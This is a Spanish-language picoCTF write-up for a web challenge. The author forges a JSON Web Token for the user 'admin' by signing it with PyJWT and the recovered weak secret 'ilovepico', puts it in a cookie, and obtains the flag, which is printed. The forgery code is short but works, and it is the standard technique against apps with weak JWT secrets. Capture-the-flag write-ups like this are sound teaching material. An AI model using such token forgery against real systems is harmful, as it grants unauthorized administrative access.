
## DESCRIPCION
- Check the admin scratchpad!

[http://fickle-tempest.picoctf.net:58994](http://fickle-tempest.picoctf.net:58994/)

## SOLUCION
```
Abri la pagina e ingrese un nombre cualquiera al user, luego abir mi cookie editor y copie los caracteres, despues de eso fui a mi terminar y puse

[notice] A new release of pip is available: 25.1.1 -> 26.2.1
[notice] To update, run: python.exe -m pip install --upgrade pip
PS C:\Users\vpabl> python
Python 3.12.1 (tags/v3.12.1:2305ca5, Dec  7 2023, 22:03:25) [MSC v.1937 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>>
>>> # 1. Definimos los datos que queremos inyectar (nuestro payload)
>>> payload = {
...     "user": "admin"
... }
>>>
>>> # 2. La clave secreta que ya sabemos que usa el servidor
>>> clave_secreta = "ilovepico"
>>>
>>> # 3. Generamos y firmamos el token usando el algoritmo HS256
>>> token_falsificado = jwt.encode(payload, clave_secreta, algorithm="HS256")
C:\Users\vpabl\AppData\Local\Programs\Python\Python312\Lib\site-packages\jwt\api_jwt.py:149: InsecureKeyLengthWarning: The HMAC key is 9 bytes long, which is below the minimum recommended length of 32 bytes for SHA256. See RFC 7518 Section 3.2.
  return self._jws.encode(
>>>
>>> # Imprimimos el resultado para copiarlo al Cookie Editor
>>> print("Tu token de admin es:")
Tu token de admin es:
>>> print(token_falsificado)
 lo que me dio una linea de caracteres que al colocarla en mi editor cookie, la guarde y recargue, me dio la bandera
 
 picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}

```

## NOTAS ADICIONALES
- Inicie el entorno: Abri la consola interactiva de Python
- creee un _payload_ (el contenido del token) donde te asignaste la identidad de `"admin"`. Le indique al script que firmara el documento usando la contraseña secreta que descubrimos (`"ilovepico"`). Ejecute la función `jwt.encode()` para empaquetar y firmar criptográficamente tu nuevo pase de acceso.

## REFERENCIAS
- Gemini ia